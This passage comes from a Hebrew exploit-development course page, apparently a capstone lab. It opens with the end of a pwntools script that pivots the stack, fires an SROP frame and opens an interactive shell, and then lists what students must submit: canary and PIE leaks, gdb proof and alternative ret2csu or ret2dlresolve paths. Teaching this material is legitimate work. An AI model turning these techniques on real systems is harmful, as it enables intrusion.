+<a id="__codelineno-17-54" name="__codelineno-17-54" href="#__codelineno-17-54"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stage</span><span class="p">)</span>                 <span class="c1"># saved rbp -&gt; the staging area (pivot target)</span>
+<a id="__codelineno-17-55" name="__codelineno-17-55" href="#__codelineno-17-55"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>             <span class="c1"># return addr -&gt; leave ; ret</span>
+<a id="__codelineno-17-56" name="__codelineno-17-56" href="#__codelineno-17-56"></a>    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-17-57" name="__codelineno-17-57" href="#__codelineno-17-57"></a>
+<a id="__codelineno-17-58" name="__codelineno-17-58" href="#__codelineno-17-58"></a>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;pivot -&gt; stage, firing SROP frame&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-59" name="__codelineno-17-59" href="#__codelineno-17-59"></a>    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;echo PWNED_$((21+21))&#39;</span><span class="p">)</span> <span class="c1"># liveness check</span>
+<a id="__codelineno-17-60" name="__codelineno-17-60" href="#__codelineno-17-60"></a>    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;PWNED_42&#39;</span> <span class="ow">in</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">):</span>
+<a id="__codelineno-17-61" name="__codelineno-17-61" href="#__codelineno-17-61"></a>        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;shell!&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-62" name="__codelineno-17-62" href="#__codelineno-17-62"></a>        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<a id="__codelineno-17-63" name="__codelineno-17-63" href="#__codelineno-17-63"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-17-64" name="__codelineno-17-64" href="#__codelineno-17-64"></a>        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s1">&#39;no shell opened, check the offsets and the SROP frame&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-65" name="__codelineno-17-65" href="#__codelineno-17-65"></a>        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a id="__codelineno-17-66" name="__codelineno-17-66" href="#__codelineno-17-66"></a>
+<a id="__codelineno-17-67" name="__codelineno-17-67" href="#__codelineno-17-67"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<a id="__codelineno-17-68" name="__codelineno-17-68" href="#__codelineno-17-68"></a>    <span class="n">exploit</span><span class="p">()</span>
+</code></pre></div>
+<p>שימו לב לנקודת הסנכרון בקוד: הקריאה שממלאת את הבמה קורה <strong>לפני</strong> ההדפסה <code>name&gt;</code>. לכן בפועל שולחים את <code>chain</code> מיד אחרי שקראנו את שורת <code>stage @</code>, ורק אז מחכים ל-<code>name&gt;</code>. אם תבלבלו את הסדר, הבתים של הבמה ייבלעו בפרומפט הלא נכון. תמיד סנכרנו מול הפלט האמיתי של הבינארי, לא מול מה שנוח לכם להניח.</p>
+<h2 id="_4">קריטריוני הצלחה והגשה<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>מה שצריך להראות בסוף:</p>
+<ul>
+<li><strong>פתיחת shell אמינה</strong> - exploit שמדליף PIE וcanary, מבצע פיבוט, ופותח shell שבו הרצתם לפחות שתי פקודות (<code>id</code> ו-<code>cat flag.txt</code>).</li>
+<li><strong>הוכחת החלון הזעיר</strong> - פלט gdb או פירוק שמראה שהoverflow מגיעה בדיוק עד return address, ושאין מקום לchain בלי פיבוט.</li>
+<li><strong>פיבוט מאומת</strong> - צילום מ-gdb שמראה את <code>rsp</code> נוחת ב-<code>stage+8</code> אחרי הפיבוט.</li>
+<li><strong>בלי libc</strong> - הוכחה שהנתיב המרכזי (SROP) עובד בלי שום קובץ או כתובת libc. אם מימשתם גם את ret2csu, ציינו את ההבדל: זה תלוי libc וזה לא.</li>
+<li><strong>לפחות נתיב חלופי אחד</strong> - ret2csu או ret2dlresolve, עם הסבר קצר למה בחרנו דווקא ב-SROP כנתיב המרכזי.</li>
+</ul>
+<p>הגישו את קוד ה-C, את סקריפט ה-exploit, ותיעוד קצר: מה ניסיתם, איפה נתקעתם, ואיך פתרתם. אם ניגשתם למטרת מתיחה - צרפו גם אותה עם הסבר.</p>
+<p>זה הקפסטון של פרק 6. אם הגעתם עד כאן עם shell, אתם כבר לא "מריצים exploit" - אתם <strong>מרכיבים</strong> אחד מטכניקות שאתם בוחרים לפי מה שהבינארי מרשה. פיבוט כדי לקנות מקום, ו-SROP כדי לקנות שליטה מלאה על האוגרים בלי להסתמך על כלום חיצוני. זה בדיוק האופן שבו נראה exploit של חולשות ברמה מקצועית.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
